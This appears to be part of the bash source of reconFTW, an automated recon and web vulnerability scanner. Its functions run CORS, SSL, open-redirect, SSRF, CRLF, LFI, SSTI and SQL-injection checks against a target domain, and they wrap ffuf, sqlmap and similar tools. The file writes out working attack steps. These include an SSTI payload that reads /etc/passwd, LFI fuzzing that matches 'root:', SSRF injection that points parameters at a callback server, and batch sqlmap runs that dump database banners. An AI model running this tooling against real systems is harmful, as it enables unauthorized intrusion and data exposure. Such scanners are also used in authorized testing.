cors(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CORS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : CORS Scan ${reset}\n\n"
			start=`date +%s`
			eval python3 $tools/Corsy/corsy.py -i ${domain}_probed.txt > ${domain}_cors.txt $DEBUG_STD
			eval cat ${domain}_cors.txt $DEBUG_ERROR && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CORS Scan Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_cors.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

test_ssl(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$TEST_SSL" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Runnning : SSL Test ${reset}\n" | $NOTIFY
			start=`date +%s`
			eval cat ${domain}_probed.txt $DEBUG_ERROR | grep "^https" | anew -q .tmp/${domain}_probed_https.txt
			$tools/testssl.sh/testssl.sh --quiet --color 0 -U -iL .tmp/${domain}_probed_https.txt > ${domain}_testssl.txt && touch $called_fn_dir/.${FUNCNAME[0]}
			#eval rm ${domain}_probed_https.txt $DEBUG_ERROR
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SSL Test Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_testssl.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

open_redirect(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$OPEN_REDIRECT" = true ]
		then
			if [ "$DEEP" = true ] ; then
				printf "${bgreen}#######################################################################\n"
				printf "${bblue} Running : Open redirects checks ${reset}\n" | $NOTIFY
				start=`date +%s`
				cat gf/${domain}_redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
				eval python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt $DEBUG_ERROR | grep "^http" > ${domain}_redirect.txt
				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" ${domain}_redirect.txt
				touch $called_fn_dir/.${FUNCNAME[0]}
				end=`date +%s`
				getElapsedTime $start $end
				printf "${bblue}\n Open Redirects Finished in ${runtime}\n" | $NOTIFY
				printf "${bblue} Results are saved in ${domain}_openredirex.txt ${reset}\n"
				printf "${bgreen}#######################################################################\n" 
			else
				if [[ $(cat gf/${domain}_redirect.txt | wc -l) -le 1000 ]]
				then
					printf "${bgreen}#######################################################################\n"
					printf "${bblue} Running : Open redirects checks ${reset}\n" | $NOTIFY
					start=`date +%s`
					cat gf/${domain}_redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
					eval python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt $DEBUG_ERROR | grep "^http" > ${domain}_redirect.txt
					sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" ${domain}_redirect.txt
					touch $called_fn_dir/.${FUNCNAME[0]}
					end=`date +%s`
					getElapsedTime $start $end
					printf "${bblue}\n Open Redirects Finished in ${runtime}\n" | $NOTIFY
					printf "${bblue} Results are saved in ${domain}_redirect.txt ${reset}\n"
				else
					printf "${bred} Skipping Open redirects: Too Much URLs to test, try with --deep flag${reset}\n" | $NOTIFY
				fi
			fi
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

ssrf_checks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SSRF_CHECKS" = true ]
	then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Running : SSRF checks ${reset}\n" | $NOTIFY
		if [ -n "$COLLAB_SERVER" ]; then
			if [ "$DEEP" = true ] ; then
				start=`date +%s`
				cat gf/${domain}_ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
				COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
				echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
				echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
				for url in $(cat .tmp/tmp_ssrf.txt); do
					ffuf -v -H "${HEADER}" -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssrf.txt
				done

				eval python3 $tools/ssrf.py $dir/gf/${domain}_ssrf.txt $COLLAB_SERVER_FIX $DEBUG_ERROR | anew -q ${domain}_ssrf.txt

				touch $called_fn_dir/.${FUNCNAME[0]}
				end=`date +%s`
				getElapsedTime $start $end
				printf "${bblue}\n SSRF Finished in ${runtime}\n" | $NOTIFY
				printf "${bblue} Results are saved in ${domain}_ssrf_confirmed.txt ${reset}\n"
			else
				if [[ $(cat gf/${domain}_ssrf.txt | wc -l) -le 1000 ]]
				then
					start=`date +%s`
					cat gf/${domain}_ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
					COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
					echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
					echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
					for url in $(cat .tmp/tmp_ssrf.txt); do
						ffuf -v -H "${HEADER}" -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssrf.txt
					done
					eval python3 $tools/ssrf.py $dir/gf/${domain}_ssrf.txt $COLLAB_SERVER_FIX $DEBUG_ERROR | anew -q ${domain}_ssrf.txt
					touch $called_fn_dir/.${FUNCNAME[0]}
					end=`date +%s`
					getElapsedTime $start $end
					printf "${bblue}\n SSRF Finished in ${runtime}, check your callback server\n" | $NOTIFY
					printf "${bblue} Results are saved in ${domain}_ssrf.txt ${reset}\n"
				else
					printf "${bred} Skipping SSRF: Too Much URLs to test, try with --deep flag${reset}\n" | $NOTIFY
				fi
			fi
		else
			printf "${bred}\n No COLLAB_SERVER defined\n" | $NOTIFY
		fi
		printf "${bgreen}#######################################################################\n"
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

crlf_checks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CRLF_CHECKS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : CRLF checks ${reset}\n" | $NOTIFY
			start=`date +%s`
			eval crlfuzz -l ${domain}_probed.txt -o ${domain}_crlf.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CRLF Finished in ${runtime}${reset}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_crlf.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

lfi(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$LFI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : LFI checks ${reset}\n" | $NOTIFY
			start=`date +%s`
			cat gf/${domain}_lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
			for url in $(cat .tmp/tmp_lfi.txt); do
				ffuf -v -mc 200 -H "${HEADER}" -w $lfi_wordlist -u $url -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_lfi.txt
			done
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n LFI Finished in ${runtime}${reset}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_lfi.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

ssti(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SSTI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : SSTI checks ${reset}\n" | $NOTIFY
			start=`date +%s`

			cat gf/${domain}_ssti.txt | qsreplace "ssti{{7*7}}" | anew -q .tmp/ssti_fuzz.txt
			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "ssti49" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssti.txt

			cat gf/${domain}_ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | anew -q .tmp/ssti_fuzz2.txt
			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssti.txt

			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SSTI Finished in ${runtime}${reset}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_ssti.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sqli(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SQLI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : SQLi checks ${reset}\n" | $NOTIFY
			start=`date +%s`
			cat gf/${domain}_sqli.txt | qsreplace FUZZ | anew -q .tmp/tmp_sqli.txt
			interlace -tL .tmp/tmp_sqli.txt -threads 10 -c "python3 $tools/sqlmap/sqlmap.py -u _target_ -b --batch --disable-coloring --random-agent --output-dir=sqlmap" &>/dev/null
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SQLi Finished in ${runtime}${reset}\n" | $NOTIFY
			printf "${bblue} Results are saved in sqlmap folder ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

deleteOutScoped(){
	if [ -z "$1" ]
	then
		cat $1 | while read outscoped
		do
			if  grep -q  "^[*]" <<< $outscoped
			then
				outscoped="${outscoped:1}"
				sed -i /"$outscoped$"/d  $2
			else
			sed -i /$outscoped/d  $2
			fi
		done
	fi
}

function getElapsedTime {
	runtime=""
	local T=$2-$1
	local D=$((T/60/60/24))
	local H=$((T/60/60%24))
	local M=$((T/60%60))
	local S=$((T%60))
	(( $D > 0 )) && runtime="$runtime$D days, "
	(( $H > 0 )) && runtime="$runtime$H hours, "
	(( $M > 0 )) && runtime="$runtime$M minutes, "
	runtime="$runtime$S seconds."
}

function isAsciiText {
	IS_ASCII="False";
	if [[ $(file $1 | grep -o 'ASCII text$') == "ASCII text" ]]
	then
		IS_ASCII="True";
	else
		IS_ASCII="False";
	fi
}

end(){
	find $dir -type f -empty | grep -v "called_fn" | xargs rm -f &>/dev/null
	find $dir -type d -empty | grep -v "called_fn" | xargs rm -rf &>/dev/null

	if [ "$REMOVETMP" = true ]
	then
		rm -rf $dir/.tmp
	fi

	if [ -n "$dir_output" ]
	then
		output
		finaldir=$dir_output
	else
		finaldir=$dir
	fi
	global_end=`date +%s`
	getElapsedTime $global_start $global_end
	printf "${bgreen}#######################################################################\n"
	text="${bred} Finished Recon on: ${domain} under ${finaldir} in: ${runtime} ${reset}\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	printf "${bgreen}#######################################################################\n"
	#Seperator for more clear messges in telegram_Bot
	echo "******  Stay safe 🦠 and secure 🔐  ******" | $NOTIFY
}

all(){
	if [ -n "$list" ]
	then
		for domain in $(cat $list); do
			start
			dorks
			subdomains_full
			subtakeover
			webprobe_full
			screenshot
			portscan
			nuclei_check
			github
			favicon
			cms_scanner
			fuzz
			cors
			params
			urlchecks
			wordlist_gen
			url_gf
			open_redirect
			ssrf_checks
			crlf_checks
			lfi
			ssti
			sqli
			jschecks
			xss
			brokenLinks
			test_ssl
			end
		done
	else
		start
		dorks
		subdomains_full
		subtakeover
		webprobe_full
		screenshot
		portscan
		nuclei_check
		github
		favicon
		cms_scanner
		fuzz
		cors
		params
		urlchecks
		wordlist_gen
		url_gf
		open_redirect
		ssrf_checks
		crlf_checks
		lfi
		ssti
		sqli
		jschecks
		xss
		brokenLinks
		test_ssl
		end
	fi
}

help(){
	printf "\n Usage: $0 [-d DOMAIN] [-l list.txt] [-x oos.txt] [-a] [-s]"
	printf "\n           	      [-w] [-i] [-v] [-h] [--deep] [--fs] [-o OUTPUT]\n\n"
	printf " ${bblue}TARGET OPTIONS${reset}\n"
	printf "   -d DOMAIN        Target domain\n"
	printf "   -l list.txt      Targets list, one per line\n"
	printf "   -x oos.txt       Exclude subdomains list (Out Of Scope)\n"
	printf " \n"
	printf " ${bblue}MODE OPTIONS${reset}\n"
	printf "   -a               Perform all checks\n"
	printf "   -s               Full subdomains scan (Subs, tko and probe)\n"
	printf "   -g               Gentle mode (Dorks, Subs, ports, nuclei, fuzz, cors and ssl)\n"
	printf "   -w               Perform web checks only without subs ${yellow}(-l required)${reset}\n"
	printf "   -i               Check all needed tools\n"
	printf "   -v               Debug/verbose mode, no file descriptor redir\n"
	printf "   -h               Show this help\n"
	printf " \n"
	printf " ${bblue}GENERAL OPTIONS${reset}\n"
	printf "   --deep           Deep scan (Enable some slow options for deeper scan)\n"
	printf "   --fs             Full scope (Enable widest scope *domain* options)\n"
	printf "   -o output/path   Define output folder\n"
	printf " \n"
	printf " ${bblue}USAGE EXAMPLES${reset}\n"
	printf " Full recon:\n"
	printf " ./reconftw.sh -d example.com -a\n"
	printf " \n"
	printf " Subdomain scanning with multiple targets:\n"
	printf " ./reconftw.sh -l targets.txt -s\n"
	printf " \n"
	printf " Web scanning for subdomain list:\n"
	printf " ./reconftw.sh -d example.com -l targets.txt -w\n"
	printf " \n"
	printf " Full recon with custom output and excluded subdomains list:\n"
	printf " ./reconftw.sh -d example.com -x out.txt -a -o custom/path\n"
}

output(){
	mkdir -p $dir_output
	mv $dir $dir_output
}

banner

if [ -z "$1" ]
then
   help
   tools_installed
   exit
fi

while getopts ":hd:-:l:x:vaisxwgto:" opt; do
	general=$@
	if [[ $general == *"-v"* ]]; then
  		unset DEBUG_STD
		unset DEBUG_ERROR
	fi
	if [[ $general == *"--deep"* ]]; then
  		DEEP=true
	fi
	if [[ $general == *"--fs"* ]]; then
  		FULLSCOPE=true
	fi
	case ${opt} in
		d ) domain=$OPTARG
			;;
		l ) list=$OPTARG
			;;
		x ) outOfScope_file=$OPTARG
			isAsciiText $outOfScope_file
			if [ "False" = "$IS_ASCII" ]
			then
				printf "\n\n${bred} Out of Scope file is not a text file${reset}\n\n" | $NOTIFY
				exit
			fi
			;;
		s ) if [ -n "$list" ]
			then
				for domain in $(cat $list); do
					start
					subdomains_full
					subtakeover
					end
				done
			else
				start
				subdomains_full
				subtakeover
				end
			fi
			exit
			;;
		a ) all
			exit
			;;
		w ) start
			if [ -n "$list" ]
			then
				if [[ "$list" = /* ]]; then
					cp $list $dir/${domain}_probed.txt
				else
					cp $SCRIPTPATH/$list $dir/${domain}_probed.txt
				fi
			fi
			nuclei_check
			cms_scanner
			fuzz
			cors
			params
			urlchecks
			wordlist_gen
			url_gf
			open_redirect
			ssrf_checks
			crlf_checks
			lfi
			ssti
			sqli
			jschecks
			xss
			brokenLinks
			test_ssl
			end
			exit
			;;
		i ) tools_full
			exit
			;;
		g ) start
			PORTSCAN_ACTIVE=false
			dorks
			subdomains_full
			subtakeover
			webprobe_full
			screenshot
			portscan
			github
			favicon
			cms_scanner
			cors
			end
			exit
			;;
		o ) dir_output=$OPTARG
			output
			;;
		\? | h | : | - | * )
			help
			;;
	esac
done
shift $((OPTIND -1))
